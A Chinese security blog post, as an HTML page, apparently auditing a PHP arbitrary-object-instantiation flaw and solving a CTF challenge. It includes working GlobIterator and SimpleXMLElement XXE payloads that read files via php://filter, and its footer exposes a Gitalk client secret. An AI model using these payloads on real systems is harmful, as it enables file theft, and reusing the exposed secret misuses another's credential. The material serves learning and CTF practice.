@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="代码如下12345678910111213141516171819202122232425262728293031function __autoload($className) &amp;#123;  include $className;&amp;#125;$controllerName &#x3D; $_GET[&#39;c&#39;];$data &#x3D; $_GET[&#39;d&#39;];if (">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 -- 实例化任意对象漏洞">
+<meta property="og:url" content="https://mayi077.github.io/2020/04/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="代码如下12345678910111213141516171819202122232425262728293031function __autoload($className) &amp;#123;  include $className;&amp;#125;$controllerName &#x3D; $_GET[&#39;c&#39;];$data &#x3D; $_GET[&#39;d&#39;];if (">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5ea581a0c2a9a83be50b3a83.jpg">
+<meta property="article:published_time" content="2020-04-26T13:50:41.000Z">
+<meta property="article:modified_time" content="2020-04-26T13:51:05.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5ea581a0c2a9a83be50b3a83.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/04/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>代码审计 -- 实例化任意对象漏洞 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/04/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          代码审计 -- 实例化任意对象漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-04-26 21:50:41 / 修改时间：21:51:05" itemprop="dateCreated datePublished" datetime="2020-04-26T21:50:41+08:00">2020-04-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" itemprop="url" rel="index">
+                    <span itemprop="name">基础积累</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">function __autoload($className) &#123;</span><br><span class="line">  include $className;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$controllerName &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">$data &#x3D; $_GET[&#39;d&#39;];</span><br><span class="line"></span><br><span class="line">if (class_exists($controllerName)) &#123;</span><br><span class="line">  $controller &#x3D; new $controllerName($data[&#39;t&#39;], $data[&#39;v&#39;]);</span><br><span class="line">  $controller-&gt;render();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &#39;There is no page with this name&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HomeController &#123;</span><br><span class="line">  private $template;</span><br><span class="line">  private $variables;</span><br><span class="line"></span><br><span class="line">  public function __construct($template, $variables) &#123;</span><br><span class="line">    $this-&gt;template &#x3D; $template;</span><br><span class="line">    $this-&gt;variables &#x3D; $variables;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function render() &#123;</span><br><span class="line">    if ($this-&gt;variables[&#39;new&#39;]) &#123;</span><br><span class="line">      echo &#39;controller rendering new response&#39;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#39;controller rendering old response&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><h4 id="class-exists"><a href="#class-exists" class="headerlink" title="class_exists"></a>class_exists</h4><p>&emsp;class_exists()函数在第二个参数不为 false 时（默认true），会去调用本程序中的<code>__autoload</code>魔术函数（如果存在的话）。<br>&emsp;而我们这题的<code>__autoload</code>是用来包含文件的，那么就存在了目录穿越任意文件读取的漏洞，这里有点不太明白，为什么原文中说：  </p>
+<blockquote>
+<p>使用路径穿越符号的前提是 PHP5~5.3(包含5.3版本)版本 之间才可以。  </p>
+</blockquote>
+<blockquote>
+<p>class_exists ：(PHP 4, PHP 5, PHP 7)  </p>
+<p>功能 ：检查类是否已定义  </p>
+<p>定义 ： bool class_exists ( string $class_name[, bool $autoload = true ] )    </p>
+<p>  $class_name 为类的名字，在匹配的时候不区分大小写。默认情况下 $autoload 为 true ，当 $autoload 为 true 时，会自动加载本程序中的 __autoload 函数；当 $autoload 为 false 时，则不调用 __autoload 函数。</p>
+</blockquote>
+<h4 id="类名和参数利用"><a href="#类名和参数利用" class="headerlink" title="类名和参数利用"></a>类名和参数利用</h4><p>&emsp;实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 SimpleXMLElement 来进行 XXE 攻击，进而读取目标文件的内容，甚至命令执行（前提是安装了PHP拓展插件expect），我们来看一下PHP手册对 SimpleXMLElement 类的定义：</p>
+<blockquote>
+<p>   SimpleXMLElement ：(PHP 5, PHP 7)<br>功能 ：用来表示XML文档中的元素，为PHP的内置类。</p>
+</blockquote>
+<p>例如：<br><a href="https://pic.downk.cc/item/5ea581a0c2a9a83be50b3a83.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5ea581a0c2a9a83be50b3a83.jpg" alt=""></a></p>
+<h3 id="CTF题目源码"><a href="#CTF题目源码" class="headerlink" title="CTF题目源码"></a>CTF题目源码</h3><p>index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; index.php</span><br><span class="line">&lt;?php</span><br><span class="line">class NotFound&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#39;404&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    function ($class)&#123;</span><br><span class="line">        new NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname &#x3D; isset($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : null;</span><br><span class="line">$param &#x3D; isset($_GET[&#39;param&#39;]) ? $_GET[&#39;param&#39;] : null;</span><br><span class="line">$param2 &#x3D; isset($_GET[&#39;param2&#39;]) ? $_GET[&#39;param2&#39;] : null;</span><br><span class="line">if(class_exists($classname))&#123;</span><br><span class="line">    $newclass &#x3D; new $classname($param,$param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    foreach ($newclass as $key&#x3D;&gt;$value)</span><br><span class="line">        echo $key.&#39;&#x3D;&gt;&#39;.$value.&#39;&lt;br&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; f1agi3hEre.php</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CTF-题解"><a href="#CTF-题解" class="headerlink" title="CTF 题解"></a>CTF 题解</h3><p>&emsp;简单的读题后发现我们可以使用 <code>XXE</code> 我们可以控制类名和参数。</p>
+<h4 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h4><p>我们先用php的内置类<code>GlobIterator</code>来搜索 flag文件名，官方文档给出的是php &gt;= 5.3.0 ，php 7 开始还没看懂。原来是 php5.3.* 和 php 7.<em>.</em> 可以用。<br>我们使用payload <code>?name=GlobIterator&amp;param=./*.php&amp;param2=0</code> 用以构造如下类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$newclass &#x3D; new GlobIterator(&#39;.&#x2F;*.php&#39;,0);</span><br></pre></td></tr></table></figure>
+<p>第一个参数指定搜索的路径和类型，第二个参数为选择文件的哪个信息作为键名（似乎几都可以）。</p>
+<h4 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h4><p>&emsp;其实重点还是我们的<code>SimpleXMLElement</code>（PHP 5, PHP 7）用它来构造一个XML文档，从而利用 XXE 。<br>&emsp;因为文件中有&lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误，所以我们这里利用PHP文件流，将要读取的文件内容经过 base64编码 后输出。如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[   </span><br><span class="line">&lt;!ENTITY name SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot; &gt;]</span><br><span class="line">&gt;</span><br><span class="line">&lt;a&gt;&amp;name;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+<p>有几个地方需要注意以下，在url中不能直接打<code>&amp;</code> 会被歧义，我们使用 <code>%26</code> 还有就是<code>resource=</code>后面不需要引号包裹。<br>最后我们的payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot; ?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY name SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;flag.php&quot; &gt;]&gt;&lt;a&gt;%26name;&lt;&#x2F;a&gt;&amp;param2&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>其实构成的是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$newclass &#x3D; new SimpleXMLElement(我们的参数1,2);</span><br></pre></td></tr></table></figure>
+<p>至于为什么第二个参数为二，实际上这里2对应的模式是 LIBXML_NOENT ，我们直接记住用二吧不然就是直接百度。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/04/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%AE%9E%E4%BE%8B%E5%8C%96%E4%BB%BB%E6%84%8F%E5%AF%B9%E8%B1%A1%E6%BC%8F%E6%B4%9E/" title="代码审计 -- 实例化任意对象漏洞">https://mayi077.github.io/2020/04/26/代码审计-实例化任意对象漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i>代码审计</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/24/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-filter-var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/" rel="prev" title="代码审计-- filter_var函数缺陷">
+      <i class="fa fa-chevron-left"></i> 代码审计-- filter_var函数缺陷
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/27/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-Smarty-SSTI/" rel="next" title="[CISCN2019 华东南赛区]Web11 -- Smarty SSTI">
+      [CISCN2019 华东南赛区]Web11 -- Smarty SSTI <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码如下"><span class="nav-number">1.</span> <span class="nav-text">代码如下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞点"><span class="nav-number">2.</span> <span class="nav-text">漏洞点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#class-exists"><span class="nav-number">2.1.</span> <span class="nav-text">class_exists</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#类名和参数利用"><span class="nav-number">2.2.</span> <span class="nav-text">类名和参数利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF题目源码"><span class="nav-number">3.</span> <span class="nav-text">CTF题目源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF-题解"><span class="nav-number">4.</span> <span class="nav-text">CTF 题解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GlobIterator"><span class="nav-number">4.1.</span> <span class="nav-text">GlobIterator</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SimpleXMLElement"><span class="nav-number">4.2.</span> <span class="nav-text">SimpleXMLElement</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="信安小蚂蚁"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">信安小蚂蚁</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">134</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">85</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/487280636@qq.com" title="E-Mail → 487280636@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=487280636&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;487280636&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/publicdomain/zero/1.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-zero.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">信安小蚂蚁</span>
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'Ov23li6cOHoOwCcszzi9',
+      clientSecret: '8f2a2156cf47355ba518edf71e62d5e1618dc229',
+      repo        : 'mayi077.github.io',
+      owner       : 'mayi077',
+      admin       : ['mayi077'],
+      id          : '438a659fcf421a0bbeaadbbff371d082',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
